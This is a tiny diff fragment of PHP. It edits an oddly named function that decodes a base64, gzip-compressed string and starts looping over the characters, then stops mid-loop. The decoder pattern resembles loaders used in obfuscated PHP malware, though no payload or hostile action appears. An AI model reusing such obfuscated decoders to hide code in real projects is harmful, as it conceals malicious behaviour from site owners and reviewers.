@@ -1,4 +1,4 @@
-<?php function FEXe($KYVqt)
+function FEXe($KYVqt)
 { 
 $KYVqt=gzinflate(base64_decode($KYVqt));
  for($i=0;$i<strlen($KYVqt);$i++)
